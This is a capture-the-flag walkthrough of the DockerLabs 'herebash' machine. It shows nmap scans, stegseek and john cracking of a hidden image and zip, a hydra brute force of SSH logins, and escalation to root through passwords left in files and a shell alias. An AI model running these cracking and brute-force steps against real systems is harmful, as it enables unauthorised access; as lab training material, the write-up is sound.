
Difficulty: **medium**
Made by: **firstatack**

FIrst of all, we make sure the machine is up, the command **ping** can do this.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.225 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.089 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.122 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2040ms
rtt min/avg/max/mdev = 0.089/0.145/0.225/0.057 ms
```

Now we can start the phase of **reconnaissance**.

---
# Reconnaissance

We can use the tool **nmap** to know what ports are open in the target.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 17:07 -05
Initiating ARP Ping Scan at 17:07
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:07, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:07
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:07, 3.57s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000028s latency).
Scanned at 2025-11-13 17:07:46 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.00 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see 2 ports open:

- Port 22 (ssh / secure shell)
- Port 80 (http / hyper-text transfer protocol)

We can do another **nmap** scan to try to know more about these ports.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ nmap -p22,80 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 17:18 -05
Nmap scan report for 172.17.0.2
Host is up (0.000084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:16:59:41:d2:f1:d4:cf:20:cc:ad:e0:f8:8c:ed:a2 (ECDSA)
|_  256 72:9b:5b:79:74:e8:18:d6:0b:31:2e:99:00:01:b5:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
```

**-p21,22,139,445** <- With this argument nmap will only scan this 3 ports that we type.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

We can see here a website and also a vulnerable version of **ssh**, this version is vulnerable to user enumeration I try it a lot to enumerate users with various tools, but I fail, let's take a look on the website first.

We can try to know what technologies use the website, we can do this a tool that is **whatweb**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Apache2 Ubuntu Default Page: It works]
```

We can see here this but nothing interesting here, let's take a look with the browser.

It seems this is the default page of apache, but we got something interesting here.

There is a button that it redirect us to another page of the website:

- http://172.17.0.2/spongebob/spongebob.html

And now we can start the phase of **enumeration**.

---
# Enumeration

This is what we see on the page:

![[Pasted image 20251113174038.png]]

Translated this it says: **A good name is also important as the method**.

And we got nothing else.

Then I try to go to the **/spongebob** directory.

And we can see this:

![[Pasted image 20251113175110.png]]

Let's see what is inside of the directory **/upload**.

![[Pasted image 20251113175248.png]]

It seems an image, let's take a look of this picture.

![[Pasted image 20251113175359.png]]

Let's download it, a picture can hide some type of information in it, this technique is called **stenography**.

And now we can begin the phase of **exploitation**

---
# Exploitation

After we download this image, we can use a tool that is **exiftool** to show us the metadata of the image.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ exiftool ohnorecallwin.jpg 
ExifTool Version Number         : 13.25
File Name                       : ohnorecallwin.jpg
Directory                       : .
File Size                       : 118 kB
File Modification Date/Time     : 2025:11:13 17:58:32-05:00
File Access Date/Time           : 2025:11:13 17:58:32-05:00
File Inode Change Date/Time     : 2025:11:13 17:58:43-05:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 880
Image Height                    : 406
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)
Image Size                      : 880x406
Megapixels                      : 0.357
```

This show us the metada of the image but nothing interesting here.

Also a image can also hide more files in it.

Let's try this with a tool that can extract this type of files, the tool is **steghide**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ steghide extract -sf ohnorecallwin.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

It seems it have a password, then we are going to do some brute force.

To do brute force in this there is a tool **stegseek**

Let's try it if it works...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ stegseek -sf ohnorecallwin.jpg -wl /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "spongebob"        
[i] Original filename: "seguro.zip".
[i] Extracting to "ohnorecallwin.jpg.out".
```

We got the passphrase of the image! it's **spongebob**

Now let's introduce this passphrase to **steghide**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ steghide extract -sf ohnorecallwin.jpg 
Enter passphrase: 
wrote extracted data to "seguro.zip".
```

We got a zip file, let's try to unzip.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ unzip seguro.zip 
Archive:  seguro.zip
[seguro.zip] secreto.txt password: 
   skipping: secreto.txt             incorrect password
```

It seems also needs a password!

We can try to brute force it too, but this time we use **john the ripper**.

But first of all we need to capture the hash of the zip file with **zip2john** 

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/herebash/seguro]
└─$ zip2john seguro.zip > hash
ver 1.0 efh 5455 efh 7875 seguro.zip/secreto.txt PKZIP Encr: 2b chk, TS_chk, cmplen=23, decmplen=11, crc=3DF4DA21 ts=8387 cs=8387 type=0
```

Okay so we are now being able to use **john**

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/herebash/seguro]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (seguro.zip/secreto.txt)     
1g 0:00:00:00 DONE (2025-11-13 09:40) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cowgirlup
Use the "--show" option to display all of the cracked passwords reliably
```

We get the password of the zip file, it's **chocolate**

Now let's unzip the file!

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/herebash/seguro]
└─$ unzip seguro.zip
Archive:  seguro.zip
[seguro.zip] secreto.txt password: 
 extracting: secreto.txt
```

Okay so we got a txt file, let's see what are his content.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/herebash/seguro]
└─$ cat secreto.txt 
aprendemos
```

Okay, it seems this is it, nothing else...

After a looooooong enumeration of the website and possible tools to enumerate the vulnerable version of ssh, I decide to use the **aprendemos** output to brute force ssh with hydra...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ hydra -t 16 -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p aprendemos ssh://172.17.0.2
```

okay... now let's wait if it works...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/herebash]
└─$ hydra -t 16 -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p aprendemos ssh://172.17.0.2
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-13 21:52:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 294.00 tries/min, 294 tries in 00:01h, 8295162 to do in 470:15h, 15 active
[STATUS] 259.33 tries/min, 778 tries in 00:03h, 8294680 to do in 533:05h, 13 active
[STATUS] 244.00 tries/min, 1708 tries in 00:07h, 8293752 to do in 566:31h, 11 active
[STATUS] 227.87 tries/min, 3418 tries in 00:15h, 8292042 to do in 606:30h, 11 active
[22][ssh] host: 172.17.0.2   login: rosa   password: aprendemos
```

after a long time we got the user **rosa** and the password **aprendemos**.

Now we login as the user rosa.

---
# Privilege Escalation

In the home directory we see something interesting:

```
rosa@51fc2f128cf7:~$ ls
-
```

there is a directory that is **-** So I decide it to rename it as **folder**

```
rosa@51fc2f128cf7:~$ mv - folder
```

after all of this we get into the **folder** directory and we see this:

```
rosa@51fc2f128cf7:~/folder$ ls
buscaelpass1   buscaelpass19  buscaelpass28  buscaelpass37  buscaelpass46  buscaelpass55  buscaelpass64
buscaelpass10  buscaelpass2   buscaelpass29  buscaelpass38  buscaelpass47  buscaelpass56  buscaelpass65
buscaelpass11  buscaelpass20  buscaelpass3   buscaelpass39  buscaelpass48  buscaelpass57  buscaelpass66
buscaelpass12  buscaelpass21  buscaelpass30  buscaelpass4   buscaelpass49  buscaelpass58  buscaelpass67
buscaelpass13  buscaelpass22  buscaelpass31  buscaelpass40  buscaelpass5   buscaelpass59  buscaelpass7
buscaelpass14  buscaelpass23  buscaelpass32  buscaelpass41  buscaelpass50  buscaelpass6   buscaelpass8
buscaelpass15  buscaelpass24  buscaelpass33  buscaelpass42  buscaelpass51  buscaelpass60  buscaelpass9
buscaelpass16  buscaelpass25  buscaelpass34  buscaelpass43  buscaelpass52  buscaelpass61  creararch.sh
buscaelpass17  buscaelpass26  buscaelpass35  buscaelpass44  buscaelpass53  buscaelpass62
buscaelpass18  buscaelpass27  buscaelpass36  buscaelpass45  buscaelpass54  buscaelpass63
```

All this folders translated it says: **findthepass**

If we get into one of this directories we found a lot of files:

```
rosa@51fc2f128cf7:~/folder/buscaelpass1$ ls
archivo1   archivo14  archivo19  archivo23  archivo28  archivo32  archivo37  archivo41  archivo46  archivo50
archivo10  archivo15  archivo2   archivo24  archivo29  archivo33  archivo38  archivo42  archivo47  archivo6
archivo11  archivo16  archivo20  archivo25  archivo3   archivo34  archivo39  archivo43  archivo48  archivo7
archivo12  archivo17  archivo21  archivo26  archivo30  archivo35  archivo4   archivo44  archivo49  archivo8
archivo13  archivo18  archivo22  archivo27  archivo31  archivo36  archivo40  archivo45  archivo5   archivo9
rosa@51fc2f128cf7:~/folder/buscaelpass1$ cat archivo1
xxxxxx:xxxxxx
rosa@51fc2f128cf7:~/folder/buscaelpass1$ cat archivo2
xxxxxx:xxxxxx
```

it seems per each one of this files there is a pattern that is **"xxxxxx"** so we need to filter each one of these files.

We can do this with the next command:

```
rosa@51fc2f128cf7:~/folder$ find . -type f 2>/dev/null | xargs grep -v xxxxxx
```

With this command **find** we are finding files (**-type f**) in the current directory (**.**) and also per each file (**xargs**) we are going to filter (**-v**) the file if the content are **xxxxxx**

After we execute the command we can see this:

```
rosa@51fc2f128cf7:~/folder$ find . -type f 2>/dev/null | xargs grep -v xxxxxx
./buscaelpass33/archivo21:pedro:ell0c0
./creararch.sh:#!/bin/bash
./creararch.sh:
./creararch.sh:# Buscamos directorios que empiezan con "busca"
./creararch.sh:for directorio in busca*; do
./creararch.sh: # Comprobamos si el directorio existe

.......
```

We notice here that the file **buscaelpass33** have the credentials of the user **pedro** and his password **ell0c0**

Let's try it if it works.

```
rosa@51fc2f128cf7:~/folder$ su pedro
Password: 
pedro@51fc2f128cf7:/home/rosa/folder$ whoami
pedro
```

Okay now we are as the user **pedro** now!

We are in the home directory of pedro, but nothing interesting here.

We can try to find files that are own by the user pedro, we can do it also with the command **find**.

```
pedro@51fc2f128cf7:~$ find / -user pedro 2>/dev/null
```

We filter directories and files that are owned by the user pedro and we can find this:

```
pedro@51fc2f128cf7:~$ find / -user pedro 2>/dev/null
/var/mail/.pass_juan

......

/home/pedro/.../.misecreto
```

After seeing a lot of results we see these 2 interesting files let's read the 2nd one first.

```
pedro@51fc2f128cf7:~$ cat /home/pedro/.../.misecreto
Consegui el pass de juan y lo tengo escondido en algun lugar del sistema fuera de mi home.
```

Translated it says: **I got the pass of juan and it's hidden somewhere outside of my home.**

We got the file now that we discover before with the command **find**.

Let's read the content.

```
pedro@51fc2f128cf7:~$ cat /var/mail/.pass_juan
ZWxwcmVzaW9uZXMK
```

It seems the password of the user **juan** let's try it.

```
pedro@51fc2f128cf7:~$ su juan
Password: 
juan@51fc2f128cf7:/home/pedro$ whoami
juan
```

And now we are as the user **juan**!

In the home directory of the user juan we can see this:

```
juan@4ce53d85299e:~$ ls -la
total 36
drwxr-x--- 1 juan juan 4096 Nov 15 06:31 .
drwxr-xr-x 1 root root 4096 Jun 17  2024 ..
-rw-r--r-- 1 juan juan  220 Jun 17  2024 .bash_logout
-rw-r--r-- 1 juan juan 3791 Jun 17  2024 .bashrc
drwx------ 2 juan juan 4096 Nov 15 06:26 .cache
drwxrwxr-x 3 juan juan 4096 Jun 17  2024 .local
-rw-rw-r-- 1 juan juan  112 Jun 17  2024 .ordenes_nuevas
-rw-r--r-- 1 juan juan  807 Jun 17  2024 .profile
```

We can see this file **"ordenes_nuevas"** let's take a look.

```
juan@4ce53d85299e:~$ cat .ordenes_nuevas 
Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.
```

Translated it says: **Hello, I am your boss and I'm tired I go to my home, I let you my pass somewhere get it and finish the job.**

After a looooooooooooooooong enumeration, I decide to see some possible aliases that uses the user juan....

```
juan@4ce53d85299e:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias pass='eljefe'
```

And we see a pass here that is **"eljefe"** let's try it with the user root...

```
juan@4ce53d85299e:~$ su root
Password: 
root@4ce53d85299e:/home/juan# whoami
root
```

And finally we are root now ***...pwned!...***
